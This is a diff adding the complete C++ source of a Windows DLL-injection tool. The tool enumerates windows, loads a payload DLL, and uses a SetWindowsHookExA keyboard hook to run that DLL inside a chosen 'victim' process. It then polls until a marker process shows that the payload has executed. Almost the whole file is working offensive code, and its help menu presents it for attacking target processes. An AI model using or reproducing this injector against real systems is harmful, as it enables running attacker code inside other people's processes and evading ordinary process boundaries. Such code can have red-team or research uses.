@@ -1,0 +1,204 @@
+#include <windows.h>
+#include <stdio.h>
+#include <tlhelp32.h>
+#include <stdlib.h>
+#include <string>
+#include <iostream>
+#include <psapi.h>
+
+using namespace std;
+
+BOOL CALLBACK EnumWindowsProc(HWND hWnd, LPARAM lParam)
+{
+	// function that prints Windows and their handles
+	DWORD dwThreadId, dwProcessId;
+	HINSTANCE hInstance;
+	char title[255];
+	WCHAR modulefilename[255];
+	HANDLE hProcess;
+
+	if (!hWnd)
+		return TRUE;		// Not a window
+	if (!::IsWindowVisible(hWnd))
+		return TRUE;		// Not visible
+	if (!SendMessage(hWnd, WM_GETTEXT, sizeof(title), (LPARAM)title))
+		return TRUE;		// No window title
+
+	hInstance = (HINSTANCE)GetWindowLong(hWnd, -6);
+	dwThreadId = GetWindowThreadProcessId(hWnd, &dwProcessId);
+	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
+
+	// GetModuleFileNameEx uses psapi, which works for NT only!
+	if (GetModuleFileNameEx(hProcess, hInstance, modulefilename, sizeof(modulefilename)))
+		printf("Window Handle: %p, Title: %s, ModuleFilename: %s, GetWindowThreadProcessId: %d\n", hWnd, title, modulefilename, dwThreadId);
+	else
+		printf("Handle: %p, Title: %s, ModuleFilename: empty\n", hWnd, title);
+	CloseHandle(hProcess);
+
+	return TRUE;
+}
+
+BOOL process_check()
+{
+	HANDLE hProcessSnap;
+	PROCESSENTRY32 pe32;
+ 
+	// take a snapshot of all processes in the system
+	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (hProcessSnap == INVALID_HANDLE_VALUE)
+	{
+		printf("[-] CreateToolhelp32Snaphost has failed!");
+		return FALSE;
+	}
+
+	pe32.dwSize = sizeof(PROCESSENTRY32);
+
+	if (!Process32First(hProcessSnap, &pe32))
+	{
+		printf("[-] Process32First has failed!");
+		CloseHandle(hProcessSnap);
+		return FALSE;
+	}
+
+	do
+	{
+		if (strcmp(pe32.szExeFile, "SumatraPortable3.2.exe") == 0)
+		{
+			return FALSE;
+		}
+	} while (Process32Next(hProcessSnap, &pe32));
+
+	CloseHandle(hProcessSnap);
+
+	return TRUE;
+}
+
+BOOL InjectDLL(HWND hWindow, LPCWSTR lpFileName)
+{
+	// load the DLL in the injector without calling the DllMain
+	HMODULE hModule = LoadLibraryEx(lpFileName, NULL, DONT_RESOLVE_DLL_REFERENCES);
+	if (hModule == NULL)
+	{
+		printf("[-] LoadLibraryExA has failed: %d\n", GetLastError());
+		return 1;
+	}
+
+	// get the exported fucntion from the payload DLL
+	HOOKPROC pExportFunction = (HOOKPROC)GetProcAddress(hModule, MAKEINTRESOURCE(1));
+	if (pExportFunction == NULL)
+	{
+		printf("[-] GetProcAddress has failed: %d\n", GetLastError());
+		return 1;
+	}
+
+	DWORD pid = 0;
+	DWORD dwThreadId = GetWindowThreadProcessId(hWindow, &pid);
+	HHOOK hHooked = SetWindowsHookExA(WH_KEYBOARD, pExportFunction, hModule, dwThreadId);
+	if (hHooked == NULL)
+	{
+		printf("[-] SetWindowsHookExA has failed: %d\n", GetLastError());
+		return 1;
+	}
+
+	if (!PostMessage(hWindow, WM_NULL, NULL, NULL))
+	{
+		printf("[-] PostThreadMessage has failed: %d\n", GetLastError());
+		return 1;
+	}
+
+	BOOL status = FALSE;
+	do
+	{
+		// do until the payload creates the specified process
+		status = process_check();
+	} while (status);
+
+	if (!UnhookWindowsHookEx(hHooked))
+	{
+		printf("[-] UnhookWindowsHookEx has failed: %d\n", GetLastError());
+		return 1;
+	}
+
+	return 0;
+}
+
+void menu()
+{
+	printf("SYNOPSIS\n");
+	printf("\tdll_injection.exe -p process_name -d dll_name\n\n");
+	printf("DESCRIPTION\n");
+	printf("\tApplication to inject a DLL into a given process using SetWindowsHookExA\n\n");
+	printf("OPTIONS\n");
+	printf("\t-h, --help\n");
+	printf("\t\tdisplay this help and exit\n");
+	printf("\t-lw, --list-windows\n");
+	printf("\t\tdisplay the active Windows with their Handles\n");
+	printf("\t-p, --process-name\n");
+	printf("\t\tSpecify the target/victim process\n");
+	printf("\t-d, --dll-path\n");
+	printf("\t\tSpecify the DLL that will be injected into the victim process\n");
+	printf("\t-wh, --window-handle\n");
+	printf("\t\tSpecify the handle of the Window into which we want to inject\n");
+}
+
+int main(int argc, char** argv)
+{
+	BOOL lset = FALSE, pset = FALSE, dset = FALSE, whset = FALSE;
+	BOOL ProcessTokenAcquired = FALSE;
+	std::string PName, DLLPath;
+	HWND hWindow = NULL;
+
+	printf("[+] Program started...\n");
+
+	for (int i = 1; i < argc; i++)
+	{
+		std::string s = argv[i];
+		// display help menu and exit
+		if (!s.compare("-h") || !s.compare("--help")) menu();
+		// print active Windows and Handles
+		if (!s.compare("-lw") || !s.compare("--list-windows"))
+		{
+			lset = TRUE;
+			printf("[+] List of active Windows:\n");
+			EnumWindows(EnumWindowsProc, NULL);
+			return 0;
+		}
+		/// check if the process name has been specified
+		if (!s.compare("-p") || !s.compare("--process-name"))
+		{
+			// debug
+			//printf("[+] input process-name: %s\n", argv[i+1]);
+			PName = argv[i + 1];
+			pset = TRUE;
+		}
+		// check if the DLL path has been specified
+		if (!s.compare("-d") || !s.compare("--dll-path"))
+		{
+			// debug
+			//printf("[+] input DLL-path: %s\n", argv[i+1]);
+			DLLPath = argv[i + 1];
+			dset = TRUE;
+		}
+		if (!s.compare("-wh") || !s.compare("--window-handle"))
+		{
+			hWindow = (HWND)strtol(argv[i + 1], NULL, 16);
+			whset = TRUE;
+		}
+	}
+	if (!((!(pset && dset && whset) && (lset)) || ((pset && dset && whset) && !(lset))))
+	{
+		printf("[-] You haven't specified a process name, a DLL path and a Window handle.\n");
+		printf("[-] You need to specify either the list option(-lw) or process name, dll name and the windows handle flags (-p, -d, -wh)\n");
+		printf("[-] Exiting...\n");
+		return 1;
+	}
+
+	printf("[+] Application will run until the payload gets executed\n");
+	// call inject DLL
+	if (!InjectDLL(hWindow, DLLPath.c_str()))
+		printf("[+] Successful injection occurred!\n");
+	else
+		printf("[-] Inject has failed\n");
+
+	return 0;
+}
